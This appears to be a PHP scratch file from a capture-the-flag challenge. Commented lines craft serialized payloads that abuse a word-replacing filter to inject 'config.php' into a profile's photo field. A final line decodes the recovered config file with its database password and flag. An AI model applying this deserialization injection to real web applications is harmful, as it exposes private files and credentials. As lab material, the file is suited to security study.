<?php
// $profile = 'a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";a:1:{i:0;s:5:"12345";}s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}';
// $profile = 'a:2:{s:8:"nickname";a:1:{i:0;s:5:"12345";}s:5:"photo";s:10:"config.php";}"s:39:"upload/804f743824c0451b2f60d81b63b6a900";}';
// $profile = 'a:2:{s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:13:"lurenxiao.jpg";}';
// $profile = 'a:2:{s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:13:"lurenxiao.jpg";}';
// var_dump(unserialize($profile));

// $a='a:4:{s:5:"phone";s:11:"66666666666";s:5:"email";s:10:"111@qq.com";s:8:"nickname";a:1:{i:0;s:5:"where";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:39:"upload/f3ccdd27d2000e3f9255a7e3e2c48800";}';
// var_dump(unserialize($profile));

// function filter($string)
// {
//         $escape = array('\'', '\\\\');
//         $escape = '/' . implode('|', $escape) . '/';
//         $string = preg_replace($escape, '_', $string);
 
//         $safe = array('select', 'insert', 'update', 'delete', 'where');
//         $safe = '/' . implode('|', $safe) . '/i';
//         return preg_replace($safe, 'hacker', $string);
// }
// $s = 'a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"};s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}';
// var_dump(filter($s));
// var_dump(unserialize($s));
// var_dump('&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&');
// $a = filter($s);
// var_dump($a);
// var_dump(unserialize($a));
// var_dump('**************************************************');
// // $profile = 'a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";s:8:"sea_sand";s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}';
// $profile = 'a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:8:"ss@q.com";s:8:"nickname";s:170:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";s:5:"photo";s:10:"config.php";}s:39:"upload/804f743824c0451b2f60d81b63b6a900";}';
 
// var_dump($profile);
// var_dump(unserialize($profile));

$result="PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezk3ZGIxNWQ1LTUyNTgtNDBmZS1iYzk2LWNiYjJiOGJhODFlMn0nOwo/Pgo=";
echo base64_decode($result);
?>